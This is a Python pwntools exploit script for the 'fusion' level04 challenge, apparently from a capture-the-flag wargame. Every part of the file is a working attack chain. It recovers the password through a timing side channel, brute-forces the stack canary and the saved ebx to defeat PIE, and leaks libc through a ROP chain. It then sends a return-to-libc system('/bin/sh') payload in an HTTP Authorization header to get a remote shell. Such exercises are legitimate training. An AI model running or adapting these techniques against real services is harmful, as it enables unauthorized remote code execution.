__author__ = '@tomereyz'

from pwn import *
import string

# LIBC = 'libc6_2.13-20ubuntu5_i386'
# https://libc.blukat.me/?q=read%3A0xb77b3240%2Cfgets%3A0xb7750760&l=libc6_2.13-20ubuntu5_i386
context.clear(arch='i386')


def guess_ebx(host, port, initial_payload, ebx_offset):
    """
    Breaking PIE by leaking ebx value.

    Leak saved ebx by exploiting stack overflow vulnerability
    and bruteforcing overflow of ebx value one byte per guess.
    * NOTE: process forks will have the same ebx value. *

    :param host: Service Host
    :type host: str
    :param port: Service Port
    :type port: int
    :param initial_payload: Payload with leaked password & canary value
    :type initial_payload: str
    :param ebx_offset: Offset of saved ebx in stack when returning from validate_credentials
    :type ebx_offset: int
    :return: Process ebx value
    :rtype: int
    """
    http_operation = 'get / HTTP/1.1'

    payload = initial_payload + cyclic(ebx_offset)

    ebx = ''

    for ebx_idx in xrange(4):
        for guess_byte in xrange(0, 255):
            guess = payload + ebx + chr(guess_byte)
            authorization = 'Authorization: Basic {bearer_token}'.format(
                bearer_token=base64.encodestring(guess).replace('\n', ''))
            r = remote(host=host, port=port)

            r.sendline(http_operation)
            r.sendline(authorization + '\n')
            try:
                d = r.recvline(timeout=2)
                if len(re.findall('200 Ok', d)):
                    ebx += chr(guess_byte)
                    break
            except EOFError:
                pass
            r.close()
        else:
            raise "Couldn't guess byte {ebx_idx}".format(ebx_idx=ebx_idx)
        log.info('Guessing ebx: {ebx}'.format(
            ebx=hex(unpack(ebx + '\x00' * (4 - len(ebx)), word_size=32))))

    return unpack(ebx + '\x00' * (4 - len(ebx)), word_size=32)


def guess_cookie(host, port, bearer_token, cookie_offset):
    """
    Breaking Stack Canary by leaking its value.

    Leak stack canary/cookie by exploiting stack overflow vulnerability
    and bruteforcing overflow of the canary one byte per guess.
    * NOTE: process forks will have the same canary value. *

    :param host: Service Host
    :type host: str
    :param port: Service Port
    :type port: int
    :param bearer_token: Service Authorization Token
    :type bearer_token: str
    :param cookie_offset: Offset of stack canary in stack when returning from validate_credentials
    :type cookie_offset: int

    :return: Process stack canary/cookie value
    :rtype: int
    """
    http_operation = 'get / HTTP/1.1'

    payload = bearer_token + cyclic(cookie_offset - len(bearer_token))

    cookie = ''

    for cookie_idx in xrange(4):
        for guess_byte in xrange(0, 255):
            guess = payload + cookie + chr(guess_byte)
            authorization = 'Authorization: Basic {bearer_token}'.format(
                bearer_token=base64.encodestring(guess).replace('\n', ''))

            r = remote(host=host, port=port)

            r.sendline(http_operation)
            r.sendline(authorization + '\n')
            try:
                if len(re.findall('200 Ok', r.recvline(timeout=2))):
                    cookie += chr(guess_byte)
                    break
            except EOFError:
                pass
            r.close()
        else:
            raise "Couldn't guess byte {cookie_idx}".format(cookie_idx=cookie_idx)
        log.info('Guessing cookie: {cookie}'.format(
            cookie=hex(unpack(cookie + '\x00' * (4 - len(cookie)), word_size=32))))

    return unpack(cookie + '\x00' * (4 - len(cookie)), word_size=32)


def guess_password(host, port):
    """
    Breaking Authorization to the service by leaking service authorization token.

    Leak authorization token by bruteforcing authentication requests

    :param host: Service Host
    :type host: str
    :param port: Service Port
    :type port: int
    :return: Service Password
    :rtype: str
    """
    password = ''
    valid_characters = list(string.ascii_uppercase) + list(string.ascii_lowercase) + list(string.digits)
    low_duration = 100
    while len(password) < 16:
        guess_char = ''
        for c in valid_characters:
            req = 'GET /flag HTTP/1.1\nAuthorization: Basic {bearer_token}'.format(
                bearer_token=base64.encodestring(password + c))
            r = remote(host=host, port=port)

            start_time = time.time()
            r.sendline(req)
            try:
                r.recv(1024, timeout=2)
                end_time = time.time()
                duration = end_time - start_time
                if duration < low_duration:
                    low_duration = duration
                    guess_char = c
            except EOFError:
                pass
            r.close()
        password += guess_char
        low_duration = 100
        log.info('Guessing password: {password}'.format(password=password))
    time.sleep(1)
    return password


def leak_libc(host, port, e, initial_payload, saved_ebx, eip_offset, ebx_offset):
    """
    Breaking ASLR by leaking libc base address.

    Leak values in got entries of read & fgets, from libc address of these functions guess libc version.
    Knowledge of libc version and function offset guess libc base address,
    via exploiting stackoverflow and rop chains to printf.
    and bruteforcing overflow of ebx value one byte per guess.
    * NOTE: process forks will have the same ebx value. *

    :param host: Service Host
    :type host: str
    :param port: Service Port
    :type port: int
    :param e: Binary ELF Object
    :type e: ELF
    :param initial_payload: Payload with leaked password & canary value
    :type initial_payload: str
    :param saved_ebx: Leaked ebx value
    :type saved_ebx: int
    :param ebx_offset: Offset of saved ebx in stack when returning from validate_credentials
    :type ebx_offset: int
    :param eip_offset: Offset of saved eip in stack when returning from validate_credentials
    :type eip_offset: int
    :return: Process libc base address
    :rtype: int
    """
    plt_printf = e.plt['__printf_chk']
    fmt_s = next(e.search('%s\x00'))
    new_line_s = next(e.search('\n\x00'))

    got_read = e.got['read']  # loaded function
    got_fgets = e.got['fgets']  # loaded function

    rop_chain = ROP(e)

    rop_chain.call(plt_printf, [fmt_s, got_read])

    rop_chain.call(plt_printf, [fmt_s, new_line_s])
    rop_chain.call(plt_printf, [fmt_s, got_fgets])
    rop_chain.call(plt_printf, [fmt_s, new_line_s])

    payload = initial_payload + cyclic(ebx_offset) + pack(saved_ebx, word_size=32) + cyclic(
        eip_offset - ebx_offset - 4) + rop_chain.chain()
    http_operation = 'get /{f_path} HTTP/1.1'.format(f_path='%22')
    authorization = 'Authorization: Basic {bearer_token}'.format(
        bearer_token=base64.encodestring(payload).replace('\n', ''))

    r = remote(host, port)
    r.sendline(http_operation)
    log.info(http_operation)
    r.sendline(authorization)

    leak_libc_read = struct.unpack('I', r.recvline()[:4])[0]
    leak_libc_fgets = struct.unpack('I', r.recvline()[:4])[0]

    log.info('leak_libc_read:{libc_read}'.format(libc_read=hex(leak_libc_read)))
    log.info('leak_libc_fgets:{libc_fgets}'.format(libc_fgets=hex(leak_libc_fgets)))
    libc_read_offset = 0x0c1240
    libc_address = leak_libc_read - libc_read_offset

    log.info('leak libc:{libc_address}'.format(libc_address=hex(libc_address)))

    return libc_address


def leak(host, port, e, cookie_offset, eip_offset, ebx_offset):
    """
    Leak Authorization Token, Stack Canary/Cookie, Saved ebx value, Libc Base Address, Image Base Address

    :param host: Service Host
    :type host: str
    :param port: Service Port
    :type port: int
    :param e: Binary ELF Object
    :type e: ELF
    :param cookie_offset: Offset of stack canary in stack when returning from validate_credentials
    :type cookie_offset: int
    :param eip_offset: Offset of saved eip in stack when returning from validate_credentials
    :type eip_offset: int
    :param ebx_offset: Offset of saved ebx in stack when returning from validate_credentials
    :type ebx_offset: int
    :return: Leak addresses
    :rtype: Tuple
    """
    password = guess_password(host, port)
    log.info('password={password}'.format(password=password))

    cookie = guess_cookie(host, port, password, cookie_offset)
    log.info('cookie={cookie}'.format(cookie=hex(cookie)))

    initial_payload = password + cyclic(cookie_offset - len(password)) + pack(cookie, word_size=32)
    ebx = guess_ebx(host, port, initial_payload, ebx_offset)
    log.info('ebx={ebx}'.format(ebx=hex(ebx)))

    image_base_address = ebx - 0x4118
    e.address = image_base_address

    libc_address = leak_libc(host, port, e, initial_payload, ebx, eip_offset, ebx_offset)
    log.info('libc_address={libc_address}'.format(libc_address=hex(libc_address)))
    return password, cookie, ebx, libc_address, image_base_address


def exploit(host, port, bearer_token, cookie, ebx, libc_address, image_base_address, cookie_offset, eip_offset,
            ebx_offset,
            rop_chain, e):
    """
    Exploit stack overflow using rop - return to libc system('/bin/sh\x00')

    :param host: Service Host
    :type host: str
    :param port: Service Port
    :type port: int
    :param bearer_token: Service Authorization Token
    :type bearer_token: str
    :param cookie: canary saved value
    :type cookie: int
    :param ebx: ebx saved value
    :type ebx: int
    :param libc_address: Libc Base Address
    :type libc_address: int
    :param image_base_address: Image Base Address
    :type image_base_address: int
    :param cookie_offset: Offset of stack canary in stack when returning from validate_credentials
    :type cookie_offset: int
    :param eip_offset: Offset of saved eip in stack when returning from validate_credentials
    :type eip_offset: int
    :param ebx_offset: Offset of saved ebx in stack when returning from validate_credentials
    :type ebx_offset: int
    :param rop_chain: rop chain object
    :type rop_chain: ROP
    :param e: Binary ELF Object
    :type e: ELF
    :return:
    """
    e.address = image_base_address

    initial_payload = bearer_token + cyclic(cookie_offset - len(bearer_token)) + pack(cookie, word_size=32)

    libc_system_offset = 0x03cb20
    libc_bin_sh_offset = 0x1388DA
    rop_chain.call(libc_address + libc_system_offset, [libc_address + libc_bin_sh_offset])

    payload = initial_payload + cyclic(ebx_offset) + pack(ebx, word_size=32) + cyclic(
        eip_offset - ebx_offset - 4) + rop_chain.chain()
    http_operation = 'get /{f_path} HTTP/1.1'.format(f_path='%22')

    authorization = 'Authorization: Basic {bearer_token}'.format(
        bearer_token=base64.encodestring(payload).replace('\n', ''))

    r = remote(host, port)
    r.sendline(http_operation)
    r.sendline(authorization)
    r.interactive()


def main(download):
    challenge_series = 'fusion'
    challenge_name = 'level04'
    challenge_port = 20004
    ssh_client = ssh(user=challenge_series, host=challenge_series, password='godmode')
    if download:
        ssh_client.download('/opt/fusion/bin/{}'.format(challenge_name))

    e = ELF(challenge_name)
    rop_chain = ROP(e)

    cookie_offset = 2048  # cyclic_find(0x7561616d) -> 2048
    saved_eip_offset = 28  # cyclic_find(0x61616168) -> 28
    saved_ebx_offset = 12  # cyclic_find(0x61616164) -> 12

    password, cookie, ebx, libc_address, image_base_address = leak(challenge_series, challenge_port, e, cookie_offset,
                                                                   saved_eip_offset, saved_ebx_offset)

    exploit(host=challenge_series, port=challenge_port, bearer_token=password, cookie=cookie, ebx=ebx,
            libc_address=libc_address,
            image_base_address=image_base_address, cookie_offset=cookie_offset, eip_offset=saved_eip_offset,
            ebx_offset=saved_ebx_offset,
            rop_chain=rop_chain, e=e)


if __name__ == '__main__':
    main(download=True)
